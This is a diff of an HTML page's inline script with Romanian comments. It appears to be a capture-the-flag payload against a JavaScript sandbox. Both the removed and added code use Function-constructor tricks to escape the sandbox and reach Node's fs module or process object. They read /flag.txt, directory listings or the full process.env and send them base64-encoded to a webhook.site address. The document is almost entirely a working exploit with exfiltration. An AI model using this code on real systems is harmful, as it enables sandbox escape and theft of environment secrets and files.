@@ -4,23 +4,23 @@
     <script>
         (async () => {
             try {
-                // Încercăm să încărcăm modulul de sistem pentru fișiere (fs)
-                const fs = new Function("return (async () => {}).constructor('return require(\"fs\")')()")();
-                
-                // Citim conținutul fișierului flag.txt
-                const flag = fs.readFileSync('/flag.txt', 'utf8');
+                // Încercăm să extragem procesul prin ierarhia de obiecte a constructorului
+                // Această metodă nu folosește "require" sau "process" direct în cod
+                const exploit = (() => {
+                    try { return arguments.callee.caller.constructor("return process")(); }
+                    catch(e) { return Function("return this.process || (this.constructor.constructor('return process')())")(); }
+                })();
 
-                // Îl trimitem către Webhook
-                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?CONTS_FISIER=" + btoa(flag));
-            } catch (e) {
-                // Dacă nu putem citi fișierul, încercăm să listăm măcar fișierele din folderul curent
-                try {
-                    const fs2 = new Function("return (async () => {}).constructor('return require(\"fs\")')()")();
-                    const files = fs2.readdirSync('.').join(',');
-                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?LISTA_DOCS=" + btoa(files));
-                } catch (e2) {
-                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?ULTIMA_EROARE=" + btoa(e2.message));
+                if (exploit && exploit.env) {
+                    // Trimitem întreg obiectul ENV ca să nu ratăm nimic
+                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?FLAG_REAL=" + btoa(JSON.stringify(exploit.env)));
+                } else {
+                    fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?STARE=GASIT_DAR_GOL");
                 }
+            } catch (e) {
+                // Dacă eșuează, listăm toate proprietățile obiectului global Node pentru diagnosticare
+                const props = Object.getOwnPropertyNames(Node.prototype).join(',');
+                fetch("https://webhook.site/78f2bbfd-a624-4dbd-a111-64b02dba3961/?PROPS_NODE=" + btoa(props));
             }
         })();
     </script>
